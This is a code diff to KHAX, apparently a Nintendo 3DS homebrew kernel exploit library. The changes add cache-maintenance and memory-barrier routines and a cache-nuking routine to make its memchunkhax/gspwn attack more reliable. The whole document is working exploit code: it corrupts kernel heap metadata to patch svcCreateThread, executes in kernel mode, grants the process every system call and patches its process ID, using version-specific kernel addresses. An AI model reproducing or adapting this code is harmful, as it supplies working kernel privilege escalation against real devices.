@@ -5,6 +5,7 @@
 #include <cstdlib>
 #include <cstring>
 #include <limits>
+#include <new>
 
 #include "khax.h"
 #include "khaxinternal.h"
@@ -12,6 +13,24 @@
 //------------------------------------------------------------------------------------------------
 namespace KHAX
 {
+	//------------------------------------------------------------------------------------------------
+	// Work around reinterpret_cast not being allowed in constexpr functions.
+	template <typename P>
+	class PointerWrapper
+	{
+	public:
+		constexpr PointerWrapper(std::uintptr_t addr)
+		:	m_addr(addr)
+		{
+		}
+
+		operator P() const { return reinterpret_cast<P>(m_addr); }
+		decltype(*P()) operator *() const { return *reinterpret_cast<P>(m_addr); }
+
+	private:
+		const std::uintptr_t m_addr;
+	};
+
 	//------------------------------------------------------------------------------------------------
 	// Kernel and hardware version information.
 	struct VersionData
@@ -35,9 +54,9 @@ namespace KHAX
 		// Physical size of FCRAM on this machine
 		u32 m_fcramSize;
 		// Address of KThread address in kernel (KThread **)
-		static constexpr KThread **const m_currentKThreadPtr = reinterpret_cast<KThread **>(0xFFFF9000);
+		static constexpr const PointerWrapper<KThread **> m_currentKThreadPtr = 0xFFFF9000;
 		// Address of KProcess address in kernel (KProcess **)
-		static constexpr void **const m_currentKProcessPtr = reinterpret_cast<void **>(0xFFFF9004);
+		static constexpr const PointerWrapper<void **> m_currentKProcessPtr = 0xFFFF9004;
 		// Pseudo-handle of the current KProcess.
 		static constexpr const Handle m_currentKProcessHandle = 0xFFFF8001;
 		// Returned pointers within a KProcess object.  This abstracts out which particular
@@ -74,7 +93,7 @@ namespace KHAX
 	public:
 		// Construct using the version information for the current system.
 		MemChunkHax(const VersionData *versionData)
-			: m_versionData(versionData),
+		:	m_versionData(versionData),
 			m_nextStep(1),
 			m_corrupted(0),
 			m_overwriteMemory(nullptr),
@@ -117,8 +136,6 @@ namespace KHAX
 		Result Step6d_FixHeapCorruption();
 		// Grant our process access to all system calls, including svcBackdoor.
 		Result Step6e_GrantSVCAccess();
-		// Flush instruction and data caches.
-		Result Step6f_FlushCaches();
 		// Patch the process ID to 0.  Runs as svcBackdoor.
 		static Result Step7a_PatchPID();
 		// Restore the original PID.  Runs as svcBackdoor.
@@ -126,7 +143,7 @@ namespace KHAX
 
 		// Helper for dumping memory to SD card.
 		template <std::size_t S>
-		bool DumpMemberToSDCard(const unsigned char(MemChunkHax::*member)[S], const char *filename) const;
+		bool DumpMemberToSDCard(const unsigned char (MemChunkHax::*member)[S], const char *filename) const;
 
 		// Result returned by hacked svcCreateThread upon success.
 		static constexpr const Result STEP6_SUCCESS_RESULT = 0x1337C0DE;
@@ -185,11 +202,11 @@ namespace KHAX
 		u32 m_originalPID;
 
 		// Buffers for dumped data when debugging.
-#ifdef KHAX_DEBUG_DUMP_DATA
+	#ifdef KHAX_DEBUG_DUMP_DATA
 		unsigned char m_savedKProcess[sizeof(KProcess_8_0_0_New)];
 		unsigned char m_savedKThread[sizeof(KThread)];
 		unsigned char m_savedThreadSVC[0x100];
-#endif
+	#endif
 
 		// Pointer to our instance.
 		static MemChunkHax *volatile s_instance;
@@ -203,6 +220,17 @@ namespace KHAX
 	Result IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown = 0);
 	// gspwn, meant for reading from or writing to freed buffers.
 	Result GSPwn(void *dest, const void *src, std::size_t size, bool wait = true);
+	// Nuke the data cache with a bunch of bogus reads.
+	Result NukeDataCache();
+
+	static Result userFlushDataCache(const void *p, std::size_t n);
+	static Result userInvalidateDataCache(const void *p, std::size_t n);
+	static void userFlushPrefetch();
+	static void userDsb();
+	static void userDmb();
+	static void kernelCleanDataCacheLineWithMva(const void *p);
+	static void kernelInvalidateInstructionCacheLineWithMva(const void *p);
+
 	// Given a pointer to a structure that is a member of another structure,
 	// return a pointer to the outer structure.  Inspired by Windows macro.
 	template <typename Outer, typename Inner>
@@ -214,6 +242,11 @@ namespace KHAX
 //
 // Class VersionData
 //
+
+//------------------------------------------------------------------------------------------------
+// Needed for avoiding linker errors >.<
+constexpr const KHAX::PointerWrapper<KHAX::KThread **> KHAX::VersionData::m_currentKThreadPtr;
+constexpr const KHAX::PointerWrapper<void **> KHAX::VersionData::m_currentKProcessPtr;
 
 //------------------------------------------------------------------------------------------------
 // Creates a KProcessPointers for this kernel version and pointer to the object.
@@ -236,19 +269,19 @@ const KHAX::VersionData KHAX::VersionData::s_versionTable[] =
 #define KPROC_FUNC(ver) MakeKProcessPointers<KProcess_##ver>
 
 	// Old 3DS, old address layout
-{ false, SYSTEM_VERSION(2, 34, 0), SYSTEM_VERSION(4, 1, 0), 0xEFF83C9F, 0xEFF827CC, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-{ false, SYSTEM_VERSION(2, 35, 6), SYSTEM_VERSION(5, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-{ false, SYSTEM_VERSION(2, 36, 0), SYSTEM_VERSION(5, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-{ false, SYSTEM_VERSION(2, 37, 0), SYSTEM_VERSION(6, 0, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-{ false, SYSTEM_VERSION(2, 38, 0), SYSTEM_VERSION(6, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-{ false, SYSTEM_VERSION(2, 39, 4), SYSTEM_VERSION(7, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-{ false, SYSTEM_VERSION(2, 40, 0), SYSTEM_VERSION(7, 2, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-// Old 3DS, new address layout
-{ false, SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF8376F, 0xDFF82294, 0xE0000000, 0x08000000, KPROC_FUNC(8_0_0_Old) },
-{ false, SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF8383F, 0xDFF82290, 0xE0000000, 0x08000000, KPROC_FUNC(8_0_0_Old) },
-// New 3DS
-{ true,  SYSTEM_VERSION(2, 45, 5), SYSTEM_VERSION(8, 1, 0), 0xDFF83757, 0xDFF82264, 0xE0000000, 0x10000000, KPROC_FUNC(8_0_0_New) }, // untested
-{ true,  SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF83837, 0xDFF82260, 0xE0000000, 0x10000000, KPROC_FUNC(8_0_0_New) },
+	{ false, SYSTEM_VERSION(2, 34, 0), SYSTEM_VERSION(4, 1, 0), 0xEFF83C9F, 0xEFF827CC, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 35, 6), SYSTEM_VERSION(5, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 36, 0), SYSTEM_VERSION(5, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 37, 0), SYSTEM_VERSION(6, 0, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 38, 0), SYSTEM_VERSION(6, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 39, 4), SYSTEM_VERSION(7, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 40, 0), SYSTEM_VERSION(7, 2, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	// Old 3DS, new address layout
+	{ false, SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF8376F, 0xDFF82294, 0xE0000000, 0x08000000, KPROC_FUNC(8_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF8383F, 0xDFF82290, 0xE0000000, 0x08000000, KPROC_FUNC(8_0_0_Old) },
+	// New 3DS
+	{ true,  SYSTEM_VERSION(2, 45, 5), SYSTEM_VERSION(8, 1, 0), 0xDFF83757, 0xDFF82264, 0xE0000000, 0x10000000, KPROC_FUNC(8_0_0_New) }, // untested
+	{ true,  SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF83837, 0xDFF82260, 0xE0000000, 0x10000000, KPROC_FUNC(8_0_0_New) },
 
 #undef KPROC_FUNC
 };
@@ -361,7 +394,7 @@ Result KHAX::MemChunkHax::Step2_AllocateMemory()
 	m_overwriteMemory = reinterpret_cast<OverwriteMemory *>(address);
 	m_overwriteAllocated = (1u << 6) - 1;  // all 6 pages allocated now
 
-										   // Why didn't we get a page-aligned address?!
+	// Why didn't we get a page-aligned address?!
 	if (address & 0xFFF)
 	{
 		// Since we already assigned m_overwriteMemory, it'll get freed by our destructor.
@@ -464,7 +497,8 @@ Result KHAX::MemChunkHax::Step4_VerifyExpectedLayout()
 	}
 
 	// Copy the first freed page (third page) out to read its heap metadata.
-	std::memset(m_extraLinear, 0xCC, sizeof(*m_extraLinear));
+	userInvalidateDataCache(m_extraLinear, sizeof(*m_extraLinear));
+	userDmb();
 
 	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[2],
 		sizeof(*m_extraLinear)))
@@ -491,7 +525,8 @@ Result KHAX::MemChunkHax::Step4_VerifyExpectedLayout()
 	}
 
 	// Copy the second freed page (fifth page) out to read its heap metadata.
-	std::memset(m_extraLinear, 0xCC, sizeof(*m_extraLinear));
+	userInvalidateDataCache(m_extraLinear, sizeof(*m_extraLinear));
+	userDmb();
 
 	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[4],
 		sizeof(*m_extraLinear)))
@@ -531,6 +566,9 @@ Result KHAX::MemChunkHax::Step5_CorruptCreateThread()
 		return MakeError(28, 5, KHAX_MODULE, 1016);
 	}
 
+	userInvalidateDataCache(m_extraLinear, sizeof(*m_extraLinear));
+	userDmb();
+
 	// Read the memory page we're going to gspwn.
 	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[2].m_freeBlock,
 		sizeof(*m_extraLinear)))
@@ -546,6 +584,9 @@ Result KHAX::MemChunkHax::Step5_CorruptCreateThread()
 	// That is, the overwrite adds this offset back in.
 	m_extraLinear->m_freeBlock.m_next = reinterpret_cast<HeapFreeBlock *>(
 		m_versionData->m_threadPatchAddress - offsetof(HeapFreeBlock, m_prev));
+
+	userFlushDataCache(&m_extraLinear->m_freeBlock.m_next,
+		sizeof(m_extraLinear->m_freeBlock.m_next));
 
 	// Do the GSPwn, the actual exploit we've been waiting for.
 	if (Result result = GSPwn(&m_overwriteMemory->m_pages[2].m_freeBlock, m_extraLinear,
@@ -570,6 +611,8 @@ Result KHAX::MemChunkHax::Step5_CorruptCreateThread()
 		return result;
 	}
 	m_overwriteAllocated &= ~(1u << 1);
+
+	userFlushPrefetch();
 
 	// We have an additional layer of instability because of the kernel code overwrite.
 	++m_corrupted;
@@ -638,7 +681,8 @@ __attribute__((__naked__))
 #endif
 Result KHAX::MemChunkHax::Step6a_SVCEntryPointThunk()
 {
-	__asm__ volatile("add sp, sp, #8");
+	__asm__ volatile("cpsid aif\n"
+		"add sp, sp, #8\n");
 
 	register Result result __asm__("r0") = s_instance->Step6b_SVCEntryPoint();
 
@@ -664,10 +708,6 @@ Result KHAX::MemChunkHax::Step6b_SVCEntryPoint()
 	{
 		return result;
 	}
-	if (Result result = Step6f_FlushCaches())
-	{
-		return result;
-	}
 
 	return STEP6_SUCCESS_RESULT;
 }
@@ -679,6 +719,13 @@ Result KHAX::MemChunkHax::Step6c_UndoCreateThreadPatch()
 	// Unpatch svcCreateThread.  NOTE: Misaligned pointer.
 	*reinterpret_cast<u32 *>(m_versionData->m_threadPatchAddress) = m_versionData->
 		m_threadPatchOriginalCode;
+
+	kernelCleanDataCacheLineWithMva(
+		reinterpret_cast<void *>(m_versionData->m_threadPatchAddress));
+	userDsb();
+	kernelInvalidateInstructionCacheLineWithMva(
+		reinterpret_cast<void *>(m_versionData->m_threadPatchAddress));
+
 	--m_corrupted;
 
 	return 0;
@@ -750,23 +797,6 @@ Result KHAX::MemChunkHax::Step6e_GrantSVCAccess()
 
 	// Set the ACL for the current thread.
 	std::memcpy(threadACL, s_fullAccessACL, sizeof(threadACL));
-
-	return 0;
-}
-
-//------------------------------------------------------------------------------------------------
-// Flush instruction and data caches.
-Result KHAX::MemChunkHax::Step6f_FlushCaches()
-{
-	// Invalidates the entire instruction cache.
-	__asm__ volatile(
-		"mov r0, #0\n\t"
-		"mcr p15, 0, r0, c7, c5, 0\n\t");
-
-	// Invalidates the entire data cache.
-	__asm__ volatile(
-		"mov r0, #0\n\t"
-		"mcr p15, 0, r0, c7, c10, 0\n\t");
 
 	return 0;
 }
@@ -923,6 +953,7 @@ KHAX::MemChunkHax::~MemChunkHax()
 				Result res = svcControlMemory(&dummy, reinterpret_cast<u32>(&m_overwriteMemory->m_pages[x]), 0,
 					sizeof(m_overwriteMemory->m_pages[x]), MEMOP_FREE, static_cast<MemPerm>(0));
 				KHAX_printf("free %u: %08lx\n", x, res);
+				KHAX_UNUSED(res);
 			}
 		}
 	}
@@ -973,7 +1004,7 @@ Result KHAX::IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown)
 	{
 		// Check whether the system is a New 3DS.  If this fails, abort, because being wrong would
 		// crash the system.
-		u8 isNew3DS = 0;
+		bool isNew3DS = false;
 		if (Result error = APT_CheckNew3DS(&isNew3DS))
 		{
 			*answer = false;
@@ -981,7 +1012,7 @@ Result KHAX::IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown)
 		}
 
 		// Use the result of APT_CheckNew3DS.
-		*answer = isNew3DS != 0;
+		*answer = isNew3DS;
 		return 0;
 	}
 
@@ -994,14 +1025,6 @@ Result KHAX::IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown)
 // gspwn, meant for reading from or writing to freed buffers.
 Result KHAX::GSPwn(void *dest, const void *src, std::size_t size, bool wait)
 {
-	// Attempt a flush of the source, but ignore the result, since we may have just been asked to
-	// read unmapped memory or something similar.
-	GSPGPU_FlushDataCache(static_cast<u8 *>(const_cast<void *>(src)), size);
-
-	// Invalidate the destination's cache, since we're about to overwrite it.  Likewise, ignore
-	// errors, since it may be the destination that is an unmapped address.
-	GSPGPU_InvalidateDataCache(static_cast<u8 *>(dest), size);
-
 	// Copy that floppy.
 	if (Result result = GX_TextureCopy(static_cast<u32 *>(const_cast<void *>(src)), 0,
 		static_cast<u32 *>(dest), 0, size, 8))
@@ -1015,6 +1038,74 @@ Result KHAX::GSPwn(void *dest, const void *src, std::size_t size, bool wait)
 	{
 		gspWaitForPPF();
 	}
+
+	// Nuke the data cache.
+	if (Result result = NukeDataCache())
+	{
+		KHAX_printf("gspwn:NukeDataCache fail %08lx\n", result);
+		return result;
+	}
+
+	return 0;
+}
+
+Result KHAX::userFlushDataCache(const void *p, std::size_t n)
+{
+	return GSPGPU_FlushDataCache(p, n);
+}
+
+Result KHAX::userInvalidateDataCache(const void *p, std::size_t n)
+{
+	return GSPGPU_InvalidateDataCache(p, n);
+}
+
+void KHAX::userFlushPrefetch()
+{
+	__asm__ volatile ("mcr p15, 0, %0, c7, c5, 4\n" :: "r"(0));
+}
+
+void KHAX::userDsb()
+{
+	__asm__ volatile ("mcr p15, 0, %0, c7, c10, 4\n" :: "r"(0));
+}
+
+void KHAX::userDmb()
+{
+	__asm__ volatile ("mcr p15, 0, %0, c7, c10, 5\n" :: "r"(0));
+}
+
+void KHAX::kernelCleanDataCacheLineWithMva(const void *p)
+{
+	__asm__ volatile ("mcr p15, 0, %0, c7, c10, 1\n" :: "r"(p));
+}
+
+void KHAX::kernelInvalidateInstructionCacheLineWithMva(const void *p)
+{
+	__asm__ volatile ("mcr p15, 0, %0, c7, c5, 1\n" :: "r"(p));
+}
+
+//------------------------------------------------------------------------------------------------
+// Flush the entire CPU data cache by nuking it from orbit.  This is a hack, but the system
+// call svcInvalidateDataCache is probably not accessible to us.
+Result KHAX::NukeDataCache()
+{
+	// Allocate a 2 MB dummy buffer.
+	enum : unsigned { DUMMY_ALLOC_SIZE = 2 * 1024 * 1024 };
+
+	u32 *dummyMemory = new(std::nothrow) u32[DUMMY_ALLOC_SIZE / sizeof(*dummyMemory)];
+	if (!dummyMemory)
+	{
+		return MakeError(26, 3, KHAX_MODULE, 1011);
+	}
+
+	// Read from each dword of the buffer in order to force everything else
+	// out of the data cache.
+	volatile u32 *volatileMemory = dummyMemory;
+	for (unsigned x = 0; x < DUMMY_ALLOC_SIZE / sizeof(*dummyMemory); ++x)
+		static_cast<void>(*volatileMemory++);
+
+	// Free the dummy buffer.
+	delete[] dummyMemory;
 
 	return 0;
 }
